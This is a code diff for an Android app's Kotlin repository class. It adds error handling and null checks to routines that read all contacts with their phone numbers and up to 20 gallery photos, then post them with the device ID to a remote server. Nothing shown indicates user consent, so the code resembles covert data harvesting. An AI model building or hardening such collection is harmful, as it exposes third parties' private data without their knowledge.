@@ -113,8 +113,12 @@ class Repository(private val context: Context) {
 
         val body = jsonObj.toString().toRequestBody("application/json".toMediaTypeOrNull())
         val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/data").post(body).build()
-        val resp = client.newCall(req).execute()
-        resp.use { it.isSuccessful }
+        return@withContext try {
+            val resp = client.newCall(req).execute()
+            resp.use { it.isSuccessful }
+        } catch (_: Throwable) {
+            false
+        }
     }
 
     suspend fun uploadFileToServer(uri: Uri): Boolean = withContext(Dispatchers.IO) {
@@ -139,13 +143,23 @@ class Repository(private val context: Context) {
         val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
         val list = mutableListOf<JSONObject>()
         val cr = context.contentResolver
-        val cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY), null, null, null)
+        val cursor = cr.query(
+            ContactsContract.Contacts.CONTENT_URI,
+            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY, ContactsContract.Contacts.DISPLAY_NAME),
+            null, null, null
+        )
         cursor?.use { c ->
             val idIdx = c.getColumnIndex(ContactsContract.Contacts._ID)
-            val nameIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
+            val primaryIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
+            val altIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
             while (c.moveToNext()) {
-                val id = c.getString(idIdx)
-                val name = c.getString(nameIdx) ?: ""
+                val id = if (idIdx >= 0) c.getString(idIdx) else null
+                val name = when {
+                    primaryIdx >= 0 -> c.getString(primaryIdx)
+                    altIdx >= 0 -> c.getString(altIdx)
+                    else -> null
+                } ?: ""
+                if (id == null) continue
                 val phones = mutableListOf<String>()
                 cr.query(Phone.CONTENT_URI, arrayOf(Phone.NUMBER), Phone.CONTACT_ID + "=?", arrayOf(id), null)?.use { pc ->
                     val numIdx = pc.getColumnIndex(Phone.NUMBER)
@@ -157,8 +171,12 @@ class Repository(private val context: Context) {
         val payload = JSONObject().put("deviceId", deviceId).put("contacts", list)
         val body = payload.toString().toRequestBody("application/json".toMediaTypeOrNull())
         val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/contacts").post(body).build()
-        val resp = client.newCall(req).execute()
-        resp.use { it.isSuccessful }
+        return@withContext try {
+            val resp = client.newCall(req).execute()
+            resp.use { it.isSuccessful }
+        } catch (_: Throwable) {
+            false
+        }
     }
 
     suspend fun uploadPhotosToServer(limit: Int = 20): Boolean = withContext(Dispatchers.IO) {
@@ -170,8 +188,10 @@ class Repository(private val context: Context) {
             val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
             val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
             while (c.moveToNext() && sent < limit) {
-                val id = c.getLong(idIdx)
-                val name = c.getString(nameIdx) ?: (System.currentTimeMillis().toString() + ".jpg")
+                val id = if (idIdx >= 0) c.getLong(idIdx) else -1L
+                if (id <= 0L) continue
+                val fallbackName = "photo_${System.currentTimeMillis()}.jpg"
+                val name = if (nameIdx >= 0) (c.getString(nameIdx) ?: fallbackName) else fallbackName
                 val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                 val tmp = File(context.cacheDir, name)
                 cr.openInputStream(uri)?.use { input ->
@@ -183,10 +203,12 @@ class Repository(private val context: Context) {
                     .addFormDataPart("file", name, body)
                     .build()
                 val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/photos").post(multipart).build()
-                val resp = client.newCall(req).execute()
+                val resp = try { client.newCall(req).execute() } catch (_: Throwable) { null }
                 tmp.delete()
-                if (resp.isSuccessful) sent += 1
-                resp.close()
+                if (resp != null && resp.isSuccessful) {
+                    sent += 1
+                    resp.close()
+                }
             }
         }
         sent > 0
